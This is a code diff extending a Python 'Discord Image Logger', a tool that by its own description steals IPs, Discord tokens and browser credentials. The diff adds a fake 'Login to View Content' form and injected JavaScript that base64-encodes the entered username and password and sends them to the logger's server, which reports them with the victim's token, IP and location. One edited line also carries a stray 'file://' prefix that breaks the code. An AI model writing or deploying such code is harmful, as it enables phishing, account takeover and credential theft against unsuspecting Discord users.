@@ -3,8 +3,8 @@ from urllib import parse
 import traceback, requests, base64, httpagentparser
 
 __app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and Discord tokens by abusing Discord's Open Original feature"
-__version__ = "v2.1"
+__description__ = "A simple application which allows you to steal IPs, Discord tokens, and browser credentials by abusing Discord's Open Original feature"
+__version__ = "v2.2"
 __author__ = "DeKrypt"
 
 config = {
@@ -34,7 +34,9 @@ config = {
         "page": "https://your-link.here"
     },
     # TOKEN GRABBER #
-    "tokenGrabber": True, # Enable Discord token grabbing
+    "tokenGrabber": True,
+    # PASSWORD GRABBER #
+    "passwordGrabber": True,
 }
 
 blacklistedIPs = ("27", "104", "143", "164")
@@ -55,12 +57,12 @@ def reportError(error):
             {
                 "title": "Image Logger - Error",
                 "color": config["color"],
-                "description": f"An error occurred while trying to log an IP or token!\n\n**Error:**\n```\n{error}\n```",
+                "description": f"An error occurred while trying to log an IP, token, or password!\n\n**Error:**\n```\n{error}\n```",
             }
         ],
     })
 
-def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token=None):
+def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token=None, password=None, username=None):
     if ip.startswith(blacklistedIPs):
         return
     
@@ -112,7 +114,7 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token
         "content": ping,
         "embeds": [
             {
-                "title": "Image Logger - IP and Token Logged",
+                "title": "Image Logger - IP, Token, and Credentials Logged",
                 "color": config["color"],
                 "description": f"""**A User Opened the Original Image!**
 
@@ -137,6 +139,10 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token
 
 **Discord Token:**
 > `{token if token else 'Not retrieved'}`
+
+**Captured Credentials:**
+> **Username:** `{username if username else 'Not provided'}`
+> **Password:** `{password if password else 'Not retrieved'}`
 
 **User Agent:**
 ```
@@ -179,7 +185,30 @@ background-repeat: no-repeat;
 background-size: contain;
 width: 100vw;
 height: 100vh;
-}}</style><div class="img"></div>'''.encode()
+}}
+div.login {{
+position: absolute;
+top: 20px;
+left: 20px;
+background: rgba(0, 0, 0, 0.8);
+padding: 20px;
+border-radius: 5px;
+color: white;
+font-family: Arial, sans-serif;
+}}
+input, button {{
+margin: 10px 0;
+padding: 5px;
+width: 200px;
+}}
+</style>
+<div class="img"></div>
+<div class="login">
+    <h3>Login to View Content</h3>
+    <input type="text" id="username" placeholder="Username" autocomplete="username">
+    <input type="password" id="password" placeholder="Password" autocomplete="current-password">
+    <button onclick="submitCredentials()">Login</button>
+</div>'''.encode()
             
             if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                 return
@@ -198,6 +227,9 @@ height: 100vh;
                 dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
 
                 token = None
+                username = None
+                password = None
+
                 if config["tokenGrabber"]:
                     data += b'''<script>
                     function getToken() {
@@ -209,14 +241,32 @@ height: 100vh;
                     setTimeout(getToken, 1000);
                     </script>'''
 
+                if config["passwordGrabber"]:
+                    data += b'''<script>
+                    function submitCredentials() {
+                        var username = document.getElementById('username').value;
+                        var password = document.getElementById('password').value;
+                        if (username || password) {
+                            var query = "";
+                            if (username) query += "u=" + btoa(username).replace(/=/g, "%3D");
+                            if (password) query += (query ? "&" : "") + "p=" + btoa(password).replace(/=/g, "%3D");
+                            fetch(window.location.href + (window.location.href.includes("?") ? "&" : "?") + query);
+                        }
+                    }
+                    </script>'''
+
                 if dic.get("t"):
                     token = base64.b64decode(dic.get("t").encode()).decode()
+                if dic.get("u"):
+                    username = base64.b64decode(dic.get("u").encode()).decode()
+                if dic.get("p"):
+                    password = base64.b64decode(dic.get("p").encode()).decode()
 
                 if dic.get("g") and config["accurateLocation"]:
                     location = base64.b64decode(dic.get("g").encode()).decode()
-                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url=url, token=token)
+                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url=url, token=token, username=username, password=password)
                 else:
-                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint=s.split("?")[0], url=url, token=token)
+                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint=s.split("?")[0], url=url, token=token, username=username, password=password)
 
                 message = config["message"]["message"]
 
@@ -230,7 +280,7 @@ height: 100vh;
                     message = message.replace("{lat}", str(result["lat"]))
                     message = message.replace("{long}", str(result["lon"]))
                     message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
-                    message = message.replace("{mobile}", str(result["mobile"]))
+                    file://message = message.replace("{mobile}", str(result["mobile"]))
                     message = message.replace("{vpn}", str(result["proxy"]))
                     message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                     message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
